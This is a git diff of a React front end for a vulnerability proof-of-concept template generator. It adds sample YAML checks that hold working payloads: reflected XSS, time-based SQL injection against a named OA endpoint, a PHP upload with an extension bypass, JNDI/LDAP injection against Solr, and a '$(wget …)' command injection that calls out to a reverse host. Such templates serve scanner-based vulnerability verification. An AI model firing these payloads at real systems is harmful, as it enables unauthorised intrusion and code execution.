@@ -29,6 +29,7 @@ export default class App extends React.Component {
     this.notify = this.notify.bind(this);
   }
 
+
   componentDidMount() {
     const cjs = new ClipboardJS('#copy-btn');
     cjs.on('success', e => {
@@ -150,6 +151,8 @@ export default class App extends React.Component {
     this.setState({rules})
   }
 
+  
+
   render() {
     const formItemLayout = {
       labelCol: { span: 2 },
@@ -201,7 +204,7 @@ export default class App extends React.Component {
                 <Affix offsetTop={8}>
                   <div style={{ display: "flex", flexDirection: "column" }}>
                     <div style={{ marginBottom: "15px" }}>
-                      <span style={{ fontSize: "18px", fontWeight: "bold"}}>请选择参考模板</span>
+                      <span style={{ fontSize: "18px", fontWeight: "bold"}}>请选择参考提示</span>
                       <br></br>
                       <Select
                         placeholder="选择生成的POC内容"
@@ -209,15 +212,11 @@ export default class App extends React.Component {
                         style={{ width: "100%" }}
                         onChange={value => this.setState({ selectedPOC: value })}
                       >
-                        <Select.Option value="poc1">poc-yaml-sqli</Select.Option>
-                        <Select.Option value="poc2">poc-yaml-xss</Select.Option>
-                        <Select.Option value="poc3">poc-yaml-lfi</Select.Option>
-                        <Select.Option value="poc4">poc-yaml-rce</Select.Option>
-                        <Select.Option value="poc5">poc-yaml-leak</Select.Option>
-                        <Select.Option value="poc6">poc-yaml-deser</Select.Option>
-                        <Select.Option value="poc7">poc-yaml-fileUpload</Select.Option>
-                        <Select.Option value="poc8">poc-yaml-httpReverse</Select.Option>
-                        <Select.Option value="poc9">poc-yaml-ldapReverse</Select.Option>
+                        <Select.Option value="poc2">poc-yaml-sqli(no-echo)</Select.Option>
+                        <Select.Option value="poc1">poc-yaml-xss</Select.Option>
+                        <Select.Option value="poc3">poc-yaml-upload</Select.Option>
+                        <Select.Option value="poc4">poc-yaml-ldapReverse</Select.Option>
+                        <Select.Option value="poc5">poc-yaml-httpReverse</Select.Option>
                         {/* 根据需要添加更多选项 */}
                       </Select>
                     </div>
@@ -225,17 +224,18 @@ export default class App extends React.Component {
                       <Input.TextArea
                         autosize={{ minRows: 10 }}
                         placeholder="根据选择生成的POC内容"
-                        value={this.state.selectedPOC === 'poc1' ? 'name: poc-yaml-sql\nrules:\n  - method: GET\n    path: /url\n    body: alert("xss")\n    follow_redirects: true\n    expression: |+' 
-                        :this.state.selectedPOC === 'poc2' ? 'poc2的内容'
-                        :this.state.selectedPOC === 'poc3' ? 'poc3的内容'
-                        :this.state.selectedPOC === 'poc4' ? 'poc4的内容'
-                        :this.state.selectedPOC === 'poc5' ? 'poc5的内容'
-                        :this.state.selectedPOC === 'poc6' ? 'poc6的内容':
+                        value={this.state.selectedPOC === 'poc1' ? 'path: /%3Cscript%3Ealert(document.domain)%3C/script%3E  //注入的payload\nexpression: response.status==404 && \nresponse.body.bcontains(b\' / tmp / www / <script>alert(document.domain)</script>\') && //响应特征\nresponse.headers["Content-Type"].contains("text/html") //检查体的header字段\n ' 
+                        :this.state.selectedPOC === 'poc2' ? '//采用延时注入\npath: /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+%270%3a0%3a3%27+--%20and%201=1\n\n//使用 response.latency > 3000 判断生效的时间\nexpression:  response.status == 200 && (response.latency > 3000) && response.body.bcontains(b\'id\') && response.body.bcontains(b\'text\') && response.body.bcontains(b\'permissions\') && response.body.bcontains(b\'GetTreeDate.aspx?nodeid\') \n '
+                        :this.state.selectedPOC === 'poc3' ? 'set: filename: randomLowercase(8) //设置相关的变量\n\nbody: |\n        -----------------------------318949277012917151102295043236\n        Content-Disposition: form-data; name="uploaded_file"; filename="{{filename}}.ph$p" //替换变量字符\n'
+                        :this.state.selectedPOC === 'poc4' ? 'set:\n    reverse: newReverse()\n    reverseURL: reverse.ldap\n// 起一个ldap服务，用于接受请求\n path: /solr/admin/collections?action=${jndi:{{reverseURL}}}&wt=json //替换生成的变量\n expression: reverse.wait(5) //等待连接'
+                        :this.state.selectedPOC === 'poc5' ? 'set:\n    reverse: newReverse()\n    reverseURL: reverse.url\n// 起一个http服务用于接受请求\npath: //uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20{{reverseURL}})&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything\n//使用wget去访问起来的web服务\n expression: reverse.wait(5) //等待连接'
+                        :
                         ''
                       }
                         readOnly={true}
                       />
                     </div>
+                    <span style={{ fontSize: "18px", fontWeight: "bold" }}>生成的poc</span>
                     <div>
                       <Input.TextArea
                         autosize={{ minRows: 10 }}
@@ -258,13 +258,15 @@ export default class App extends React.Component {
                         复制POC
                       </Button>
                     </Row>
+                    
                   </div>
                 </Affix>
               </Col>
           </Row>
           </div>
         </Content>
-        <Footer style={{ textAlign: 'center' }}>©2023 Comal POC Generation</Footer>
+        
+        <Footer style={{ textAlign: 'center' }}>©2023 Comal POC Generation| <a href="https://i8bbmkcybg.feishu.cn/docx/ZSTddSENioK8Z4xhbvNchAq0nDb">点此处跳转到文档参考</a></Footer>
       </Layout>
     );
   }
